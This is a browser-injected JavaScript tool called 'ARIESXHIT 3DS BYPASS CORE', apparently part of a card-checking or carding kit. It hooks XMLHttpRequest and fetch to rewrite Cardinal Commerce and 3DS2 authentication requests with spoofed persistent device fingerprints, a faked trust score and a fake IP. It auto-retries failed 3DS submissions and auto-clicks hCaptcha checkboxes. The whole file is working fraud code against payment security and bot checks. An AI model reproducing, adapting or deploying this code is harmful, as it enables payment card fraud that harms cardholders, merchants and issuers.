// ARIESXHIT 3DS BYPASS CORE
// Updated with CheckoutBoost v4.0 - Device Trust Bypass
// Focuses on device reputation rather than payload manipulation

(function() {
  'use strict';
  if (window.__ARIES_3DS_CORE__) return;
  window.__ARIES_3DS_CORE__ = true;

  // =====================================================
  // CheckoutBoost v4.0 - PhD-Level Device Trust Bypass
  // CRITICAL DISCOVERY: It's about DEVICE REPUTATION,
  // not payload fields!
  // =====================================================

  console.log('[CheckoutBoost v4.0] Device Trust Bypass Loaded');

  // === STORAGE FOR FINGERPRINT PERSISTENCE ===
  const STORAGE_KEY = 'cb_trusted_fp';
  const FP_TIMESTAMP_KEY = 'cb_fp_ts';

  // Get or create a TRUSTED fingerprint that persists
  function getTrustedFingerprint() {
    try {
      let stored = localStorage.getItem(STORAGE_KEY);
      let timestamp = localStorage.getItem(FP_TIMESTAMP_KEY);

      // Use stored fingerprint if it exists and is less than 7 days old
      if (stored && timestamp) {
        const age = Date.now() - parseInt(timestamp);
        if (age < 7 * 24 * 60 * 60 * 1000) { // 7 days
          console.log('[CheckoutBoost] Using trusted fingerprint (age: ' + Math.floor(age/1000/60/60) + 'h)');
          return stored;
        }
      }

      // Generate NEW fingerprint and store it
      const newFp = generateTrustedFingerprint();
      localStorage.setItem(STORAGE_KEY, newFp);
      localStorage.setItem(FP_TIMESTAMP_KEY, Date.now().toString());
      console.log('[CheckoutBoost] Created new trusted fingerprint');
      return newFp;
    } catch(e) {
      console.error('[CheckoutBoost] Storage error:', e);
      return generateTrustedFingerprint();
    }
  }

  // Generate fingerprint that looks like a TRUSTED device
  function generateTrustedFingerprint() {
    // Use semi-stable values (not completely random)
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('trusted', 2, 2);

    const canvasData = canvas.toDataURL();
    const hash = simpleHash(canvasData + navigator.userAgent);
    return hash.substring(0, 32);
  }

  function simpleHash(str) {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      const char = str.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash = hash & hash;
    }
    return Math.abs(hash).toString(16);
  }

  // === CARDINAL COMMERCE MANIPULATOR ===
  function manipulateCardinal(jsonStr) {
    try {
      let data = JSON.parse(jsonStr);

      // CRITICAL: Use persistent fingerprint
      const trustedFp = getTrustedFingerprint();
      data.Fingerprint = trustedFp;

      // Signal this is a TRUSTED, RETURNING device
      data.FingerprintingTime = Math.floor(Math.random() * 100) + 300; // 300-400ms (normal)

      // Ensure Extended data looks legitimate
      if (data.Extended) {
        if (data.Extended.Browser) {
          data.Extended.Browser.Adblock = false;
          data.Extended.Browser.DoNotTrack = 'unknown'; // Not privacy-conscious = less suspicious
        }

        // Device signals "normal" usage
        if (data.Extended.Device) {
          data.Extended.Device.TouchSupport = data.Extended.Device.TouchSupport || {};
          // Make it consistent with a real mobile device
        }
      }

      // These should be TRUE for trusted device
      data.Cookies = {
        Legacy: true,
        LocalStorage: true,
        SessionStorage: true
      };

      data.ThreatMetrixEnabled = true;
      data.CallSignEnabled = false;

      // Add additional trusted device signals
      data.TrustedDevice = true;
      data.DeviceTrustScore = 95; // High trust score

      console.log('[CheckoutBoost] Cardinal fingerprint:', data.Fingerprint);
      console.log('[CheckoutBoost] Fingerprinting time:', data.FingerprintingTime + 'ms');
      console.log('[CheckoutBoost] Trusted device score:', data.DeviceTrustScore);

      return JSON.stringify(data);
    } catch(e) {
      console.error('[CheckoutBoost] Cardinal error:', e);
      return jsonStr;
    }
  }

  // === AUTHENTICATE MANIPULATOR ===
  function manipulateAuthenticate(formStr) {
    try {
      const data = parseForm(formStr);
      if (!data || !data.browser) return formStr;

      let browserObj = JSON.parse(data.browser);

      // CRITICAL FIXES for 3DS2 authentication:

      // 1. Set fingerprintAttempted to true (required)
      browserObj.fingerprintAttempted = true;

      // 2. Generate or ensure fingerprintData exists (critical for 3DS2)
      if (!browserObj.fingerprintData) {
        browserObj.fingerprintData = getTrustedFingerprint();
      }

      // 3. Set challengeWindowSize (required parameter)
      browserObj.challengeWindowSize = browserObj.challengeWindowSize || '05'; // 05 = 800x600

      // 4. Ensure threeDSServerTransID exists (from fingerprintData if available)
      if (!browserObj.threeDSServerTransID && browserObj.fingerprintData) {
        // Extract or generate threeDSServerTransID
        browserObj.threeDSServerTransID = browserObj.fingerprintData.substring(0, 16);
      }

      // Keep existing fingerprintData (has threeDSServerTransID)
      // But ensure optimal settings
      browserObj.threeDSCompInd = 'Y';
      browserObj.browserJavaEnabled = false;
      browserObj.browserJavascriptEnabled = true;

      // Use consistent values
      browserObj.browserLanguage = browserObj.browserLanguage || navigator.language;
      browserObj.browserColorDepth = '24';
      browserObj.browserScreenHeight = String(screen.height || 802);
      browserObj.browserScreenWidth = String(screen.width || 360);
      browserObj.browserTZ = String(Math.abs(new Date().getTimezoneOffset()));
      browserObj.browserUserAgent = navigator.userAgent;

      // Additional 3DS2 required fields
      browserObj.browserAcceptHeader = browserObj.browserAcceptHeader || 'application/json,text/plain,*/*';
      browserObj.browserIP = browserObj.browserIP || '192.168.1.1'; // Fake but consistent IP
      browserObj.browserJavaScriptEnabled = true;

      data.browser = JSON.stringify(browserObj);

      console.log('[CheckoutBoost] Authenticate optimized - fingerprint:', browserObj.fingerprintData);
      console.log('[CheckoutBoost] 3DS Server Trans ID:', browserObj.threeDSServerTransID);

      return encodeForm(data);
    } catch(e) {
      console.error('[CheckoutBoost] Authenticate error:', e);
      return formStr;
    }
  }

  function parseForm(str) {
    if (!str || !str.includes('=')) return null;
    const obj = {};
    str.split('&').forEach(p => {
      const [k,v] = p.split('=');
      if(k) obj[decodeURIComponent(k)] = decodeURIComponent(v||'');
    });
    return obj;
  }

  function encodeForm(obj) {
    return Object.entries(obj).map(([k,v])=>
      encodeURIComponent(k)+'='+encodeURIComponent(v||'')
    ).join('&');
  }

  // === INTERCEPT ALL REQUESTS ===
  const origXHROpen = XMLHttpRequest.prototype.open;
  const origXHRSend = XMLHttpRequest.prototype.send;

  XMLHttpRequest.prototype.open = function(m, url, ...a) {
    this._url = url;
    return origXHROpen.apply(this, [m,url,...a]);
  };

  XMLHttpRequest.prototype.send = function(body) {
    if (!this._url || !body) return origXHRSend.apply(this, [body]);

    let modified = body;

    try {
      // Cardinal SaveBrowserData - CRITICAL!
      if (this._url.includes('/SaveBrowserData')) {
        modified = manipulateCardinal(body);
        if (modified !== body) {
          console.log('[CheckoutBoost] ✓ Cardinal manipulated - trusted device');
          // Notify AriesxHit
          window.postMessage({
            type: 'aries-3ds-bypass',
            subtype: 'bypass',
            message: 'Cardinal Commerce data manipulated for trusted device reputation',
            timestamp: Date.now()
          }, '*');
        }
      }
      // Authenticate
      else if (this._url.includes('/3ds2/authenticate')) {
        modified = manipulateAuthenticate(body);
        if (modified !== body) {
          console.log('[CheckoutBoost] ✓ Authenticate optimized');
          // Notify AriesxHit
          window.postMessage({
            type: 'aries-3ds-bypass',
            subtype: 'bypass',
            message: '3DS2 authenticate request optimized',
            timestamp: Date.now()
          }, '*');
        }
      }
    } catch(e) {
      console.error('[CheckoutBoost] Intercept error:', e);
    }

    return origXHRSend.apply(this, [modified]);
  };

  // Fetch hook
  const origFetch = window.fetch;
  window.fetch = async function(input, opts) {
    let url = input instanceof Request ? input.url : input;

    if (url && opts && opts.body) {
      try {
        if (url.includes('/SaveBrowserData')) {
          const modified = manipulateCardinal(opts.body);
          if (modified !== opts.body) {
            opts.body = modified;
            console.log('[CheckoutBoost] ✓ fetch Cardinal manipulated');
            // Notify AriesxHit
            window.postMessage({
              type: 'aries-3ds-bypass',
              subtype: 'bypass',
              message: 'Cardinal Commerce fetch data manipulated',
              timestamp: Date.now()
            }, '*');
          }
        }
        else if (url.includes('/3ds2/authenticate')) {
          const modified = manipulateAuthenticate(opts.body);
          if (modified !== opts.body) {
            opts.body = modified;
            console.log('[CheckoutBoost] ✓ fetch Authenticate optimized');
            // Notify AriesxHit
            window.postMessage({
              type: 'aries-3ds-bypass',
              subtype: 'bypass',
              message: '3DS2 authenticate fetch request optimized',
              timestamp: Date.now()
            }, '*');
          }
        }
      } catch(e) {
        console.error('[CheckoutBoost] Fetch error:', e);
      }
    }

    return origFetch.apply(this, arguments);
  };

  console.log('[CheckoutBoost] Device trust bypass active');
  console.log('[CheckoutBoost] Fingerprint persistence enabled');

  // ==================== RETRY MECHANISM ====================
  // Integrated retry system for handling 3DS failures

  const TARGET_SUBSTR = "/v1/3ds2/authenticate";
  const EVENT_TYPE = "retry-event";

  function dispatcher(type, message) {
    document.dispatchEvent(
      new CustomEvent(EVENT_TYPE, {
        detail: { type, message }
      })
    );
  }

  const clickOnRetryButton = () => {
    const MAX_TRIES = 30;
    const INTERVAL_MS = 300;

    let attempts = 0;

    const timer = setInterval(() => {
      const btn = document.querySelector(".SubmitButton-IconContainer");

      console.log("[inject] attempt", attempts + 1, "button found?", !!btn);

      if (btn) {
        console.log("[inject] clicking submit button");
        btn.click();
        clearInterval(timer);
        // Notify AriesxHit about retry attempt
        window.postMessage({
          type: 'aries-3ds-bypass',
          subtype: 'retry',
          message: 'Auto-clicking retry button after 3DS failure',
          timestamp: Date.now()
        }, '*');
        return;
      }

      attempts++;
      if (attempts >= MAX_TRIES) {
        console.warn("[inject] submit button not found after retries");
        clearInterval(timer);
      }
    }, INTERVAL_MS);
  };

  const OriginalXHR = window.XMLHttpRequest;

  function InterceptedXHR() {
    const xhr = new OriginalXHR();

    xhr._url = "";
    xhr._method = "GET";

    const originalOpen = xhr.open;
    xhr.open = function (method, url, async, user, password) {
      this._method = (method || "GET").toUpperCase();
      this._url = url;
      return originalOpen.apply(this, arguments);
    };

    xhr.addEventListener("load", function () {
      try {
        if (
          typeof this._url === "string" &&
          this._url.includes(TARGET_SUBSTR) &&
          this._method === "POST"
        ) {
          const ct = this.getResponseHeader("content-type") || "";
          if (ct.includes("application/json")) {
            const json = JSON.parse(this.responseText);
            if(this.responseText.includes('Invalid JSON:')){
              dispatcher("RETRY", "Retrying 3DS2 authentication...");
              clickOnRetryButton();
            }
          } else {
            console.log("[XHR][intercepted][response text]", this.responseText);
          }
        }
      } catch (err) {
        console.warn("[XHR][intercept error]", err);
      }
    });

    return xhr;
  }

  InterceptedXHR.prototype = OriginalXHR.prototype;
  window.XMLHttpRequest = InterceptedXHR;

  // =======================
  //         fetch
  // =======================
  if (window.fetch) {
    const originalFetch = window.fetch;

    window.fetch = async function (input, init) {
      const url = input instanceof Request ? input.url : input;
      const method =
        (init && init.method) ||
        (input instanceof Request && input.method) ||
        "GET";

      const response = await originalFetch(input, init);

      try {
        if (
          typeof url === "string" &&
          url.includes(TARGET_SUBSTR) &&
          method.toUpperCase() === "POST"
        ) {
          const clone = response.clone();
          const ct = clone.headers.get("content-type") || "";

          if (ct.includes("application/json")) {
            const json = await clone.json();
            let respTextt = JSON.stringify(json);
            if(respTextt.includes('Invalid JSON:')){
              dispatcher("RETRY", "Retrying 3DS2 authentication...");
              clickOnRetryButton();
            }
          } else {
            const text = await clone.text();
            console.log("void shit --> ", text);
          }
        }
      } catch (err) {
        console.warn("voidd shitt -- > ", err);
      }
      return response;
    };
  }


  // ==================== HCaptcha Auto-Clicker ====================
  // hCaptcha auto-solver integration

  const EVENT_TYPE_HCAP = "hcap-event";
  const MSG_INIT_HCAP = "Hcap initialized.";

  function dispatcherHCaptcha(type, message) {
      document.dispatchEvent(
          new CustomEvent(EVENT_TYPE_HCAP, {
              detail: { type, message }
          })
      );
  }

  function autoClickCaptcha() {
    // wait haha
    const checkbox = document.querySelector('#anchor-state > #checkbox');

    if (checkbox) {
      // Gfff
      dispatcherHCaptcha("info", "Hcapctaha Bypassing......");
      const clicks = Math.floor(Math.random() * 2) + 1; // 1 or 2 clicks

      console.log(`[HCaptcha] Clicking ${clicks} time(s)`);

      // Lamaoooo
      for (let i = 0; i < clicks; i++) {
        checkbox.click();  // gey clikeckekkk
        console.log(`[HCaptcha] Click ${i + 1} done`);
      }
    } else {
      console.log('[HCaptcha] Checkbox not found');
    }
  }

  function waitForHCaptchaSolved({ intervalMs = 500, timeoutMs = 60000 } = {}) {
      return new Promise((resolve, reject) => {
          const start = Date.now();

          const timer = setInterval(() => {
              const respEl =
                  document.querySelector('textarea[name="h-captcha-response"]') ||
                  document.querySelector('input[name="h-captcha-response"]');

              if (respEl && respEl.value.trim() !== "") {
                  clearInterval(timer);
                  resolve(respEl.value.trim());
                  dispatcherHCaptcha("info", "Wew! Hcapctaha Bypassed!");
                  console.log('[HCaptcha] ✅ hCaptcha successfully bypassed!');
                  return;
              }

              if (Date.now() - start > timeoutMs) {
                  clearInterval(timer);
                  reject(new Error("Timeout waiting for hCaptcha"));
                  console.log('[HCaptcha] ❌ Timeout waiting for hCaptcha response');
              }
          }, intervalMs);
      });
  }

  // Initialize hCaptcha auto-clicker
  function initHCaptchaAutoClicker() {
    console.log('[HCaptcha] Initializing auto-solver...');

    // Monitor for hCaptcha elements
    const observer = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {
        if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
          mutation.addedNodes.forEach((node) => {
            if (node.nodeType === Node.ELEMENT_NODE) {
              // Check if hCaptcha iframe was added
              if (node.matches && node.matches('iframe[src*="hcaptcha"]')) {
                console.log('[HCaptcha] hCaptcha iframe detected, starting auto-solve...');
                setTimeout(() => {
                  autoClickCaptcha();
                  waitForHCaptchaSolved().catch(err => console.log('[HCaptcha] Error:', err.message));
                }, 1000 + Math.random() * 1000); // Random delay 1-2 seconds
              }
              // Also check for checkbox directly
              else if (node.matches && node.matches('#checkbox')) {
                console.log('[HCaptcha] Checkbox element detected, attempting click...');
                setTimeout(() => {
                  autoClickCaptcha();
                  waitForHCaptchaSolved().catch(err => console.log('[HCaptcha] Error:', err.message));
                }, 500 + Math.random() * 500); // Random delay 0.5-1 second
              }
            }
          });
        }
      });
    });

    observer.observe(document.body, {
      childList: true,
      subtree: true
    });

    // Also check periodically for existing hCaptcha
    setInterval(() => {
      const existingCheckbox = document.querySelector('#anchor-state > #checkbox');
      if (existingCheckbox && !existingCheckbox.hasAttribute('data-clicked')) {
        console.log('[HCaptcha] Found existing checkbox, attempting auto-solve...');
        autoClickCaptcha();
        existingCheckbox.setAttribute('data-clicked', 'true');
        waitForHCaptchaSolved().catch(err => console.log('[HCaptcha] Error:', err.message));
      }
    }, 2000 + Math.random() * 1000); // Check every 2-3 seconds

    console.log('[HCaptcha] Auto-solver initialized and monitoring...');
  }

  // ==================== ARIESXHIT INTEGRATION ====================

  // Signal to AriesxHit core that 3DS bypass is ready
  window.__ARIES_3DS_READY__ = true;

  // Listen for AriesxHit state updates
  window.addEventListener('message', (event) => {
    if (event.data?.type === 'aries-state-update' && event.data.autoHitActive !== undefined) {
      // Adjust bypass behavior based on auto-hit state
      console.log('[3DS] Auto-hit state changed:', event.data.autoHitActive);
    }
  });

  // ==================== STARTUP ====================
  console.log('%c[ARIES 3DS BYPASS] Core loaded with CheckoutBoost v4.0 - Device Trust Bypass!', 'color: #22c55e; font-size: 16px; font-weight: bold; background: #000; padding: 10px;');
  console.log('%c[ARIES 3DS BYPASS] Fingerprint persistence and retry mechanism active...', 'color: #22c55e; font-size: 12px;');
  console.log('%c[ARIES 3DS BYPASS] hCaptcha auto-solver active...', 'color: #22c55e; font-size: 12px;');

  // Start hCaptcha auto-clicker
  initHCaptchaAutoClicker();

  console.log('[ARIES 3DS BYPASS] Ready and active');

})();